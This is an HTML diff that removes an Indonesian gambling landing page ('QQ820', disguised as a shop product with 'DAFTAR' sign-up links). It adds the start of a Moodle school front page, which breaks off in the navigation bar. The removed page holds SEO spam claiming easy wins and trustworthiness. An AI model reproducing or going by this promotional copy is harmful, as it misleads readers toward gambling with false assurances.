@@ -1,368 +1,368 @@
-
 <!DOCTYPE html>
-<html lang="en-US" data-website-id="1" data-oe-company-name="QQ820">
-  <head>
-    <meta charset="utf-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
-    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
-    <meta name="generator" content="Odoo" />
-    <meta name="description" content="QQ820 sebagai situs agen chip domino online terbaru yang menjual dengan harga sangat miring, sebagai agen chip domino murah meriah terbaru tahun ini 2024."/>
-    <meta property="og:type" content="website" />
-    <meta property="og:title" content="QQ820 - Situs Agen Chip Domino Paling Terbaru Murah Meriah Dijamin Gacor" />
-    <meta property="og:site_name" content="QQ820" />
-    <meta property="og:url" content="https://198.58.100.241/" />
-    <meta property="og:image" content="https://myshopifycloud.com/assets/casinoqq3.webp" />
-    <meta property="og:description" content="QQ820 sebagai situs agen chip domino online terbaru yang menjual dengan harga sangat miring, sebagai agen chip domino murah meriah terbaru tahun ini 2024."/>
-    <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:title" content="QQ820 - Situs Agen Chip Domino Paling Terbaru Murah Meriah Dijamin Gacor" />
-    <meta name="twitter:image" content="https://myshopifycloud.com/assets/casinoqq3.webp" />
-    <meta name="twitter:description" content="QQ820 sebagai situs agen chip domino online terbaru yang menjual dengan harga sangat miring, sebagai agen chip domino murah meriah terbaru tahun ini 2024."/>
-    <link rel="amphtml" href="https://pub-979ef7a5193140a49ab5af1406407d98.r2.dev/hipjnet.html" />
-    <link rel="canonical" href="https://198.58.100.241/" />
-    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="" />
-    <title>QQ820 - Situs Agen Chip Domino Paling Terbaru Murah Meriah Dijamin Gacor</title>
-    <link type="image/x-icon" rel="shortcut icon" href="https://myshopifycloud.com/assets/favico-19.png" />
-    <link rel="preload" href="https://oerp.minumminum.com/web/static/lib/fontawesome/fonts/fontawesome-webfont.woff2?v=4.7.0" as="font" crossorigin="" />
-    <link type="text/css" rel="stylesheet" href="https://oerp.minumminum.com/web/content/858-1b19b81/1/web.assets_common.css" data-asset-xmlid="web.assets_common" data-asset-version="1b19b81" />
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha512-Kc323vGBEqzTmouAECnVceyQqyqdsSiqLQISBL29aUW4U/M7pSPA/gEUZQqv1cwx4OnYxTxve5UMg5GT6L4JJg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
-    <link type="text/css" rel="stylesheet" href="https://oerp.minumminum.com/web/content/859-ed40f64/1/web.assets_frontend.css" data-asset-xmlid="web.assets_frontend" data-asset-version="ed40f64" />
-    <script id="web.layout.odooscript" type="text/javascript">
-      var odoo = {
-        csrf_token: "36447fbc375848cdb7be0881709f8a51a46dbe68o1753514827",
-        debug: "",
-      };
-    </script>
-    <script type="text/javascript">
-      odoo.session_info = {
-        "is_admin": false,
-        "is_system": false,
-        "is_website_user": true,
-        "user_id": false,
-        "is_frontend": true,
-        "translationURL": "/website/translations",
-        "cache_hashes": {
-          "translations": "05071fb879321bf01f941f60fab1f126f565cdad"
-        }
-      };
-      if (!/(^|;\s)tz=/.test(document.cookie)) {
-        const userTZ = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        document.cookie = `tz=${userTZ}; path=/`;
-      }
-    </script>
-    <script defer="defer" type="text/javascript" src="https://oerp.minumminum.com/web/content/191-198e187/1/web.assets_common_minimal_js.js" data-asset-xmlid="web.assets_common_minimal_js" data-asset-version="198e187"></script>
-    <script defer="defer" type="text/javascript" src="https://oerp.minumminum.com/web/content/192-06266f9/1/web.assets_frontend_minimal_js.js" data-asset-xmlid="web.assets_frontend_minimal_js" data-asset-version="06266f9"></script>
-    <script defer="defer" type="text/javascript" data-src="https://oerp.minumminum.com/web/content/861-28f5e63/1/web.assets_common_lazy.js" data-asset-xmlid="web.assets_common_lazy" data-asset-version="28f5e63"></script>
-    <script defer="defer" type="text/javascript" data-src="https://oerp.minumminum.com/web/content/862-e47e3f5/1/web.assets_frontend_lazy.js" data-asset-xmlid="web.assets_frontend_lazy" data-asset-version="e47e3f5"></script>
-  </head>
-  <style>
-    body {
-    margin: 0;
-    font-family: "Open Sans", "Odoo Unicode Support Noto", sans-serif;
-    font-size: 1rem;
-    font-weight: 400;
-    line-height: 1.5;
-    color: #ffffff;
-    text-align: left;
-    background-color: #000000;
-    }
-    .o_cc1, .navbar-light, #wrapwrap.o_header_overlay > header:not(.o_header_affixed):not(.o_top_menu_collapse_shown) > .navbar {
-    background-color: #000000;
-    color: #ffffff;
-    }
-    .breadcrumb {
-    display: -webkit-box;
-    display: -webkit-flex;
-    display: flex;
-    -webkit-flex-wrap: wrap;
-    flex-wrap: wrap;
-    padding: 0.75rem 1rem;
-    margin-bottom: 1rem;
-    list-style: none;
-    background-color: #434547;
-    border-radius: 0.25rem;
-    }
-    .breadcrumb-item.active {
-    color: #ffffff;
-    }
-    .breadcrumb-item + .breadcrumb-item::before {
-    display: inline-block;
-    padding-right: 0.5rem;
-    color: #ffffff;
-    content: "/";
-    }
-    .form-control {
-    display: block;
-    width: 100%;
-    height: calc(1.5em + 0.75rem + 2px);
-    padding: 0.375rem 0.75rem;
-    font-size: 1rem;
-    font-weight: 400;
-    line-height: 1.5;
-    color: #e2e5e9;
-    background-color: #434547;
-    background-clip: padding-box;
-    border: 1px solid #434547;
-    border-radius: 0.25rem;
-    transition: border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;
-    }
-    .o_footer{
-        background: #cc5c00;
-    }
-    .o_cc5 a:not(.btn), .o_footer a:not(.btn), .o_cc5 .btn-link, .o_footer .btn-link, .o_colored_level .o_cc5 a:not(.btn), .o_colored_level .o_cc5 .btn-link {
-        color: #ffffff;
-    }
-    a {
-        color: #ff7300;
-        text-decoration: none;
-    }
 
-    a:hover {
-        color: #ff7300;
-        text-decoration: underline;
-    }
-    .btn-primary-1 {
-        color: #ffffff;
-        background-color: #cc5c00;
-        border-color: #cc5c00;
-    }
-    .btn-primary-1:hover {
-        color: #ffffff;
-        background-color: #ff7300;
-        border-color: #ff7300;
-    }
-</style>
-  <body class="">
-    <div id="wrapwrap" class="   ">
-      <header id="top" data-anchor="true" data-name="Header" class="  o_header_standard">
-        <nav data-name="Navbar" class="navbar navbar-expand-lg navbar-light o_colored_level o_cc shadow-sm">
-          <div id="top_menu_container" class="container justify-content-start justify-content-lg-between">
-            <a href="/" class="navbar-brand logo mr-4">
-              <span role="img" aria-label="Logo of QQ820" title="QQ820">
-                <img src="https://myshopifycloud.com/assets/qqgroup-logo.png" class="img img-fluid" alt="QQ820" loading="lazy" />
-              </span>
+<html  dir="ltr" lang="en" xml:lang="en">
+<head>
+    <title>AULA VIRTUAL CFP AMERICANO</title>
+    <link rel="shortcut icon" href="https://aulavirtual.cfpamericano.com.ec/theme/image.php/boost/theme/1727854264/favicon" />
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta name="keywords" content="moodle, AULA VIRTUAL CFP AMERICANO" />
+<link rel="stylesheet" type="text/css" href="https://aulavirtual.cfpamericano.com.ec/theme/yui_combo.php?rollup/3.17.2/yui-moodlesimple-min.css" /><script id="firstthemesheet" type="text/css">/** Required in order to fix style inclusion problems in IE with YUI **/</script><link rel="stylesheet" type="text/css" href="https://aulavirtual.cfpamericano.com.ec/theme/styles.php/boost/1727854264_1/all" />
+<script type="text/javascript">
+//<![CDATA[
+var M = {}; M.yui = {};
+M.pageloadstarttime = new Date();
+M.cfg = {"wwwroot":"https:\/\/aulavirtual.cfpamericano.com.ec","sesskey":"EB6ceIWMzA","themerev":"1727854264","slasharguments":1,"theme":"boost","iconsystemmodule":"core\/icon_system_fontawesome","jsrev":"1727854264","admin":"admin","svgicons":true,"usertimezone":"America\/New_York","contextid":2};var yui1ConfigFn = function(me) {if(/-skin|reset|fonts|grids|base/.test(me.name)){me.type='css';me.path=me.path.replace(/\.js/,'.css');me.path=me.path.replace(/\/yui2-skin/,'/assets/skins/sam/yui2-skin')}};
+var yui2ConfigFn = function(me) {var parts=me.name.replace(/^moodle-/,'').split('-'),component=parts.shift(),module=parts[0],min='-min';if(/-(skin|core)$/.test(me.name)){parts.pop();me.type='css';min=''}
+if(module){var filename=parts.join('-');me.path=component+'/'+module+'/'+filename+min+'.'+me.type}else{me.path=component+'/'+component+'.'+me.type}};
+YUI_config = {"debug":false,"base":"https:\/\/aulavirtual.cfpamericano.com.ec\/lib\/yuilib\/3.17.2\/","comboBase":"https:\/\/aulavirtual.cfpamericano.com.ec\/theme\/yui_combo.php?","combine":true,"filter":null,"insertBefore":"firstthemesheet","groups":{"yui2":{"base":"https:\/\/aulavirtual.cfpamericano.com.ec\/lib\/yuilib\/2in3\/2.9.0\/build\/","comboBase":"https:\/\/aulavirtual.cfpamericano.com.ec\/theme\/yui_combo.php?","combine":true,"ext":false,"root":"2in3\/2.9.0\/build\/","patterns":{"yui2-":{"group":"yui2","configFn":yui1ConfigFn}}},"moodle":{"name":"moodle","base":"https:\/\/aulavirtual.cfpamericano.com.ec\/theme\/yui_combo.php?m\/1727854264\/","combine":true,"comboBase":"https:\/\/aulavirtual.cfpamericano.com.ec\/theme\/yui_combo.php?","ext":false,"root":"m\/1727854264\/","patterns":{"moodle-":{"group":"moodle","configFn":yui2ConfigFn}},"filter":null,"modules":{"moodle-core-popuphelp":{"requires":["moodle-core-tooltip"]},"moodle-core-chooserdialogue":{"requires":["base","panel","moodle-core-notification"]},"moodle-core-checknet":{"requires":["base-base","moodle-core-notification-alert","io-base"]},"moodle-core-maintenancemodetimer":{"requires":["base","node"]},"moodle-core-event":{"requires":["event-custom"]},"moodle-core-dragdrop":{"requires":["base","node","io","dom","dd","event-key","event-focus","moodle-core-notification"]},"moodle-core-blocks":{"requires":["base","node","io","dom","dd","dd-scroll","moodle-core-dragdrop","moodle-core-notification"]},"moodle-core-tooltip":{"requires":["base","node","io-base","moodle-core-notification-dialogue","json-parse","widget-position","widget-position-align","event-outside","cache-base"]},"moodle-core-handlebars":{"condition":{"trigger":"handlebars","when":"after"}},"moodle-core-lockscroll":{"requires":["plugin","base-build"]},"moodle-core-languninstallconfirm":{"requires":["base","node","moodle-core-notification-confirm","moodle-core-notification-alert"]},"moodle-core-notification":{"requires":["moodle-core-notification-dialogue","moodle-core-notification-alert","moodle-core-notification-confirm","moodle-core-notification-exception","moodle-core-notification-ajaxexception"]},"moodle-core-notification-dialogue":{"requires":["base","node","panel","escape","event-key","dd-plugin","moodle-core-widget-focusafterclose","moodle-core-lockscroll"]},"moodle-core-notification-alert":{"requires":["moodle-core-notification-dialogue"]},"moodle-core-notification-confirm":{"requires":["moodle-core-notification-dialogue"]},"moodle-core-notification-exception":{"requires":["moodle-core-notification-dialogue"]},"moodle-core-notification-ajaxexception":{"requires":["moodle-core-notification-dialogue"]},"moodle-core-actionmenu":{"requires":["base","event","node-event-simulate"]},"moodle-core-formchangechecker":{"requires":["base","event-focus","moodle-core-event"]},"moodle-core_availability-form":{"requires":["base","node","event","event-delegate","panel","moodle-core-notification-dialogue","json"]},"moodle-backup-backupselectall":{"requires":["node","event","node-event-simulate","anim"]},"moodle-backup-confirmcancel":{"requires":["node","node-event-simulate","moodle-core-notification-confirm"]},"moodle-course-util":{"requires":["node"],"use":["moodle-course-util-base"],"submodules":{"moodle-course-util-base":{},"moodle-course-util-section":{"requires":["node","moodle-course-util-base"]},"moodle-course-util-cm":{"requires":["node","moodle-course-util-base"]}}},"moodle-course-formatchooser":{"requires":["base","node","node-event-simulate"]},"moodle-course-dragdrop":{"requires":["base","node","io","dom","dd","dd-scroll","moodle-core-dragdrop","moodle-core-notification","moodle-course-coursebase","moodle-course-util"]},"moodle-course-management":{"requires":["base","node","io-base","moodle-core-notification-exception","json-parse","dd-constrain","dd-proxy","dd-drop","dd-delegate","node-event-delegate"]},"moodle-course-modchooser":{"requires":["moodle-core-chooserdialogue","moodle-course-coursebase"]},"moodle-course-categoryexpander":{"requires":["node","event-key"]},"moodle-form-dateselector":{"requires":["base","node","overlay","calendar"]},"moodle-form-passwordunmask":{"requires":[]},"moodle-form-shortforms":{"requires":["node","base","selector-css3","moodle-core-event"]},"moodle-question-chooser":{"requires":["moodle-core-chooserdialogue"]},"moodle-question-preview":{"requires":["base","dom","event-delegate","event-key","core_question_engine"]},"moodle-question-searchform":{"requires":["base","node"]},"moodle-availability_completion-form":{"requires":["base","node","event","moodle-core_availability-form"]},"moodle-availability_date-form":{"requires":["base","node","event","io","moodle-core_availability-form"]},"moodle-availability_grade-form":{"requires":["base","node","event","moodle-core_availability-form"]},"moodle-availability_group-form":{"requires":["base","node","event","moodle-core_availability-form"]},"moodle-availability_grouping-form":{"requires":["base","node","event","moodle-core_availability-form"]},"moodle-availability_profile-form":{"requires":["base","node","event","moodle-core_availability-form"]},"moodle-mod_assign-history":{"requires":["node","transition"]},"moodle-mod_forum-subscriptiontoggle":{"requires":["base-base","io-base"]},"moodle-mod_quiz-quizbase":{"requires":["base","node"]},"moodle-mod_quiz-util":{"requires":["node","moodle-core-actionmenu"],"use":["moodle-mod_quiz-util-base"],"submodules":{"moodle-mod_quiz-util-base":{},"moodle-mod_quiz-util-slot":{"requires":["node","moodle-mod_quiz-util-base"]},"moodle-mod_quiz-util-page":{"requires":["node","moodle-mod_quiz-util-base"]}}},"moodle-mod_quiz-toolboxes":{"requires":["base","node","event","event-key","io","moodle-mod_quiz-quizbase","moodle-mod_quiz-util-slot","moodle-core-notification-ajaxexception"]},"moodle-mod_quiz-dragdrop":{"requires":["base","node","io","dom","dd","dd-scroll","moodle-core-dragdrop","moodle-core-notification","moodle-mod_quiz-quizbase","moodle-mod_quiz-util-base","moodle-mod_quiz-util-page","moodle-mod_quiz-util-slot","moodle-course-util"]},"moodle-mod_quiz-questionchooser":{"requires":["moodle-core-chooserdialogue","moodle-mod_quiz-util","querystring-parse"]},"moodle-mod_quiz-autosave":{"requires":["base","node","event","event-valuechange","node-event-delegate","io-form"]},"moodle-mod_quiz-modform":{"requires":["base","node","event"]},"moodle-message_airnotifier-toolboxes":{"requires":["base","node","io"]},"moodle-filter_glossary-autolinker":{"requires":["base","node","io-base","json-parse","event-delegate","overlay","moodle-core-event","moodle-core-notification-alert","moodle-core-notification-exception","moodle-core-notification-ajaxexception"]},"moodle-filter_mathjaxloader-loader":{"requires":["moodle-core-event"]},"moodle-editor_atto-rangy":{"requires":[]},"moodle-editor_atto-editor":{"requires":["node","transition","io","overlay","escape","event","event-simulate","event-custom","node-event-html5","node-event-simulate","yui-throttle","moodle-core-notification-dialogue","moodle-core-notification-confirm","moodle-editor_atto-rangy","handlebars","timers","querystring-stringify"]},"moodle-editor_atto-plugin":{"requires":["node","base","escape","event","event-outside","handlebars","event-custom","timers","moodle-editor_atto-menu"]},"moodle-editor_atto-menu":{"requires":["moodle-core-notification-dialogue","node","event","event-custom"]},"moodle-report_eventlist-eventfilter":{"requires":["base","event","node","node-event-delegate","datatable","autocomplete","autocomplete-filters"]},"moodle-report_loglive-fetchlogs":{"requires":["base","event","node","io","node-event-delegate"]},"moodle-gradereport_grader-gradereporttable":{"requires":["base","node","event","handlebars","overlay","event-hover"]},"moodle-gradereport_history-userselector":{"requires":["escape","event-delegate","event-key","handlebars","io-base","json-parse","moodle-core-notification-dialogue"]},"moodle-tool_capability-search":{"requires":["base","node"]},"moodle-tool_lp-dragdrop-reorder":{"requires":["moodle-core-dragdrop"]},"moodle-tool_monitor-dropdown":{"requires":["base","event","node"]},"moodle-assignfeedback_editpdf-editor":{"requires":["base","event","node","io","graphics","json","event-move","event-resize","transition","querystring-stringify-simple","moodle-core-notification-dialog","moodle-core-notification-alert","moodle-core-notification-warning","moodle-core-notification-exception","moodle-core-notification-ajaxexception"]},"moodle-atto_accessibilitychecker-button":{"requires":["color-base","moodle-editor_atto-plugin"]},"moodle-atto_accessibilityhelper-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_align-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_bold-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_charmap-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_clear-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_collapse-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_emoticon-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_equation-button":{"requires":["moodle-editor_atto-plugin","moodle-core-event","io","event-valuechange","tabview","array-extras"]},"moodle-atto_html-beautify":{},"moodle-atto_html-codemirror":{"requires":["moodle-atto_html-codemirror-skin"]},"moodle-atto_html-button":{"requires":["promise","moodle-editor_atto-plugin","moodle-atto_html-beautify","moodle-atto_html-codemirror","event-valuechange"]},"moodle-atto_image-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_indent-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_italic-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_link-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_managefiles-usedfiles":{"requires":["node","escape"]},"moodle-atto_managefiles-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_media-button":{"requires":["moodle-editor_atto-plugin","moodle-form-shortforms"]},"moodle-atto_noautolink-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_orderedlist-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_recordrtc-recording":{"requires":["moodle-atto_recordrtc-button"]},"moodle-atto_recordrtc-button":{"requires":["moodle-editor_atto-plugin","moodle-atto_recordrtc-recording"]},"moodle-atto_rtl-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_strike-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_subscript-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_superscript-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_table-button":{"requires":["moodle-editor_atto-plugin","moodle-editor_atto-menu","event","event-valuechange"]},"moodle-atto_title-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_underline-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_undo-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_unorderedlist-button":{"requires":["moodle-editor_atto-plugin"]}}},"gallery":{"name":"gallery","base":"https:\/\/aulavirtual.cfpamericano.com.ec\/lib\/yuilib\/gallery\/","combine":true,"comboBase":"https:\/\/aulavirtual.cfpamericano.com.ec\/theme\/yui_combo.php?","ext":false,"root":"gallery\/1727854264\/","patterns":{"gallery-":{"group":"gallery"}}}},"modules":{"core_filepicker":{"name":"core_filepicker","fullpath":"https:\/\/aulavirtual.cfpamericano.com.ec\/lib\/javascript.php\/1727854264\/repository\/filepicker.js","requires":["base","node","node-event-simulate","json","async-queue","io-base","io-upload-iframe","io-form","yui2-treeview","panel","cookie","datatable","datatable-sort","resize-plugin","dd-plugin","escape","moodle-core_filepicker","moodle-core-notification-dialogue"]},"core_comment":{"name":"core_comment","fullpath":"https:\/\/aulavirtual.cfpamericano.com.ec\/lib\/javascript.php\/1727854264\/comment\/comment.js","requires":["base","io-base","node","json","yui2-animation","overlay","escape"]},"mathjax":{"name":"mathjax","fullpath":"https:\/\/cdnjs.cloudflare.com\/ajax\/libs\/mathjax\/2.7.2\/MathJax.js?delayStartupUntil=configured"}}};
+M.yui.loader = {modules: {}};
+
+//]]>
+</script>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body  id="page-site-index" class="format-site course path-site chrome dir-ltr lang-en yui-skin-sam yui3-skin-sam aulavirtual-cfpamericano-com-ec pagelayout-frontpage course-1 context-2 notloggedin ">
+
+    <a class="sr-only sr-only-focusable" href="#maincontent">Skip to main content</a>
+</div><script type="text/javascript" src="https://aulavirtual.cfpamericano.com.ec/theme/yui_combo.php?rollup/3.17.2/yui-moodlesimple-min.js"></script><script type="text/javascript" src="https://aulavirtual.cfpamericano.com.ec/lib/javascript.php/1727854264/lib/javascript-static.js"></script>
+<script type="text/javascript">
+//<![CDATA[
+document.body.className += ' jsenabled';
+//]]>
+</script>
+
+
+
+    <nav class="fixed-top navbar navbar-light bg-white navbar-expand moodle-has-zindex" aria-label="Site navigation">
+    
+            <div data-region="drawer-toggle" class="d-inline-block mr-3">
+                <button aria-expanded="false" aria-controls="nav-drawer" type="button" class="btn nav-link float-sm-left mr-1 btn-light bg-gray" data-action="toggle-drawer" data-side="left" data-preference="drawer-open-nav"><i class="icon fa fa-bars fa-fw " aria-hidden="true"  ></i><span class="sr-only">Side panel</span></button>
+            </div>
+    
+            <a href="https://aulavirtual.cfpamericano.com.ec" class="navbar-brand 
+                    d-none d-sm-inline
+                    ">
+                <span class="site-name d-none d-md-inline">Moodle Description</span>
             </a>
-            <button type="button" data-toggle="collapse" data-target="#top_menu_collapse" class="navbar-toggler ml-auto">
-              <span class="navbar-toggler-icon o_not_editable"></span>
-            </button>
-            <div id="top_menu_collapse" class="collapse navbar-collapse order-last order-lg-0">
-              <ul id="top_menu" class="nav navbar-nav o_menu_loading flex-grow-1">
-                <li class="nav-item">
-                  <a role="menuitem" href="/" class="nav-link ">
-                    <span>Home</span>
-                  </a>
-                </li>
-                <li class="nav-item">
-                  <a role="menuitem" href="#" class="nav-link ">
-                    <span>Shop</span>
-                  </a>
-                </li>
-                <li class="nav-item">
-                  <a role="menuitem" href="#" class="nav-link ">
-                    <span>Blog</span>
-                  </a>
-                </li>
-                <li class="nav-item">
-                  <a role="menuitem" href="#" class="nav-link ">
-                    <span>Contact us</span>
-                  </a>
-                </li>
-                <li class="nav-item mx-lg-3 divider d-none"></li>
-                <li class="o_wsale_my_cart  nav-item mx-lg-3">
-                  <a href="#" class="nav-link">
-                    <i class="fa fa-shopping-cart"></i>
-                    <sup class="my_cart_quantity badge badge-primary" data-order-id="">0</sup>
-                  </a>
-                </li>
-                <li class="o_wsale_my_wish d-none nav-item mr-lg-3 o_wsale_my_wish_hide_empty">
-                  <a href="#" class="nav-link">
-                    <i class="fa fa-1x fa-heart"></i>
-                    <sup class="my_wish_quantity o_animate_blink badge badge-primary">0</sup>
-                  </a>
-                </li>
-                <li class="nav-item ml-lg-auto o_no_autohide_item">
-                  <a href="https://lkgw.cc/qq820-altbrand" class="nav-link font-weight-bold">DAFTAR</a>
-                </li>
-              </ul>
-            </div>
-            <div class="oe_structure oe_structure_solo" id="oe_structure_header_default_1">
-              <section class="s_text_block" data-snippet="s_text_block" data-name="Text">
-                <div class="container">
-                  <a href="https://lkgw.cc/qq820-altbrand" class="btn btn-primary-1 ml-4"><b>LOGIN</b></a>
-                </div>
-              </section>
-            </div>
-          </div>
-        </nav>
-      </header>
-      <main>
-        <div itemscope="itemscope" itemtype="http://schema.org/Product" id="wrap" class="js_sale ecom-zoomable zoomodoo-next">
-          <section id="product_detail" class="container py-2 oe_website_sale " data-view-track="1">
-            <div class="row">
-              <div class="col-md-4">
-                <ol class="breadcrumb">
-                  <li class="breadcrumb-item">
-                    <a href="#">Products</a>
-                  </li>
-                  <li class="breadcrumb-item active">
-                    <span>QQ820</span>
-                  </li>
-                </ol>
-              </div>
-            </div>
-            <div class="row">
-              <div class="col-md-6 col-xl-8">
-                <div id="o-carousel-product" class="carousel slide" data-ride="carousel" data-interval="0">
-                  <div class="carousel-outer position-relative">
-                    <div class="carousel-inner h-auto">
-                      <div class="carousel-item h-auto active">
-                        <div class="d-flex align-items-center justify-content-center h-auto">
-                          <img src="https://myshopifycloud.com/assets/casinoqq3.webp" itemprop="image" class="img img-fluid product_detail_img mh-auto" alt="QQ820 - Situs Agen Chip Domino Paling Terbaru Murah Meriah Dijamin Gacor" data-zoom="1" data-zoom-image="https://myshopifycloud.com/assets/casinoqq3.webp" loading="lazy" />
-                        </div>
-                      </div>
-                    </div>
-                  </div>
-                  <div class="d-none d-md-block text-center"></div>
-                </div>
-              </div>
-              <div class="col-md-6 col-xl-4" id="product_details">
-                <h1 itemprop="name">QQ820 - Situs Agen Chip Domino Paling Terbaru Murah Meriah Dijamin Gacor</h1>
-                <span itemprop="url" style="display:none;">https://198.58.100.241/</span>
-                <form action="#" method="POST">
-                  <input type="hidden" name="csrf_token" value="36447fbc375848cdb7be0881709f8a51a46dbe68o1753514827" />
-                  <div class="js_product js_main_product">
-                    <input type="hidden" class="product_id" name="product_id" value="129" />
-                    <input type="hidden" class="product_template_id" name="product_template_id" value="129" />
-                    <ul class="d-none js_add_cart_variants" data-attribute_exclusions="{'exclusions: []'}"></ul>
-                    <div itemprop="offers" itemscope="itemscope" itemtype="http://schema.org/Offer" class="product_price mt16">
-                      <h4 class="oe_price_h4 css_editable_mode_hidden">
-                        <span data-oe-type="monetary" data-oe-expression="combination_info['list_price']" style="text-decoration: line-through; white-space: nowrap;" class="text-danger oe_default_price d-none">Rp <span class="oe_currency_value">10.000</span>
-                        </span>
-                        <b data-oe-type="monetary" data-oe-expression="combination_info['price']" class="oe_price" style="white-space: nowrap;">Rp <span class="oe_currency_value">10.000</span>
-                        </b>
-                        <span itemprop="price" style="display:none;">10.000</span>
-                        <span itemprop="priceCurrency" style="display:none;">IDR</span>
-                      </h4>
-                      <h4 class="css_non_editable_mode_hidden decimal_precision" data-precision="0">
-                        <span>Rp <span class="oe_currency_value">10.000</span>
-                        </span>
-                      </h4>
-                    </div>
-                    <p class="css_not_available_msg alert alert-warning">This combination does not exist.</p>
-                    <div class="css_quantity input-group" contenteditable="false">
-                      <div class="input-group-prepend">
-                        <a class="btn btn-secondary js_add_cart_json" aria-label="Remove one" title="Remove one" href="#">
-                          <i class="fa fa-minus"></i>
-                        </a>
-                      </div>
-                      <input type="text" class="form-control quantity" data-min="1" name="add_qty" value="1" />
-                      <div class="input-group-append">
-                        <a class="btn btn-secondary float_left js_add_cart_json" aria-label="Add one" title="Add one" href="#">
-                          <i class="fa fa-plus"></i>
-                        </a>
-                      </div>
-                    </div>
-                    <a role="button" id="add_to_cart" class="btn btn-primary-1 btn-lg mt16 js_check_product a-submit d-block d-sm-inline-block" href="https://lkgw.cc/qq820-altbrand">
-                      <i class="fa fa-shopping-cart"></i><b> DAFTAR DISINI!! </b></a>
-                    <div class="availability_messages o_not_editable"></div>
-                    <div id="product_option_block">
-                    </div>
-                  </div>
-                </form>
-                <div>
-                  <div id="product_attributes_simple">
-                    <p class="text-muted"></p>
-                  </div>
-                </div>
-                <hr />
-
-                <p><a href="https://198.58.100.241/">QQ820</a> sebagai situs dan aplikasi game slot online yang dapat diakses melalui perangkat QQ820 Android, QQ820 memberikan kemudahan bagi para pemain untuk menikmati kemenangan bermain kapan saja dan di mana saja. Salah satu alasan mengapa QQ820 begitu populer adalah karena reputasinya sebagai situs <a href="https://198.58.100.241/">slot gacor gampang menang</a> tingkat kemenangan RTP tinggi dan pembayaran yang cepat menjadi daya tarik tersendiri bagi para pemain. Selain itu, QQ820 juga dikenal sebagai situs yang sangat terpercaya saat ini.</p>
-                <hr />
-              </div>
-            </div>
-          </section>
-        </div>
-      </main>
-      <footer id="bottom" data-anchor="true" data-name="Footer" class="o_footer o_colored_level o_cc ">
-        <div id="footer" class="oe_structure oe_structure_solo">
-          <section class="s_text_block pt40 pb16" data-snippet="s_text_block" data-name="Text">
-            <div class="container">
-              <div class="row">
-                <div class="col-lg-2 pt24 pb24">
-                  <h5 class="mb-3">Useful Links</h5>
-                  <ul class="list-unstyled">
-                    <li>
-                      <a href="/">Home</a>
-                    </li>
-                    <li>
-                      <a href="#">About us</a>
-                    </li>
-                    <li>
-                      <a href="#">Products</a>
-                    </li>
-                    <li>
-                      <a href="#">Services</a>
-                    </li>
-                    <li>
-                      <a href="#">Legal</a>
-                    </li>
-                    <li>
-                      <a href="#">Contact us</a>
-                    </li>
-                  </ul>
-                </div>
-
-                <div id="connect" class="col-lg-4 offset-lg-1 pt24 pb24">
-                  <h5 class="mb-3">Connect with us</h5>
-                  <ul class="list-unstyled">
-                    <li>
-                      <i class="fa fa-comment fa-fw mr-2"></i>
-                      <span>
-                        <a href="#">Contact us</a>
-                      </span>
-                    </li>
-                    <li>
-                      <i class="fa fa-envelope fa-fw mr-2"></i>
-                      <span>
-                        <a href="mailto:info@qq820.com">info@qq820.com</a>
-                      </span>
-                    </li>
-                  </ul>
-                  <div class="s_share text-left" data-snippet="s_share" data-name="Social Media">
-                    <h5 class="s_share_title d-none">Follow us</h5>
-                    <a href="https://www.facebook.com/" class="s_share_facebook" target="_blank">
-                      <i class="fa fa-facebook rounded-circle shadow-sm"></i>
-                    </a>
-                    <a href="https://twitter.com/" class="s_share_twitter" target="_blank">
-                      <i class="fa fa-twitter rounded-circle shadow-sm"></i>
-                    </a>
-                    <a href="https://id.linkedin.com/" class="s_share_linkedin" target="_blank">
-                      <i class="fa fa-linkedin rounded-circle shadow-sm"></i>
-                    </a>
-                    <a href="/" class="text-800 float-right">
-                      <i class="fa fa-home rounded-circle shadow-sm"></i>
-                    </a>
-                  </div>
-                </div>
-              </div>
-            </div>
-          </section>
-        </div>
-        <div class="o_footer_copyright o_colored_level o_cc" data-name="Copyright">
-          <div class="container py-3">
-            <div class="row">
-              <div class="col-sm text-center text-sm-left text-muted">
-                <span class="o_footer_copyright_name mr-2">Copyright &copy; QQ820</span>
-              </div>
-
-            </div>
-          </div>
-        </div>
-      </footer>
+    
+            <ul class="navbar-nav d-none d-md-flex">
+                <!-- custom_menu -->
+                <li class="dropdown nav-item">
+    <a class="dropdown-toggle nav-link" id="drop-down-672fa8e038d6d672fa8e0352f74" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" href="#" aria-controls="drop-down-menu-672fa8e038d6d672fa8e0352f74">
+        English ‎(en)‎
+    </a>
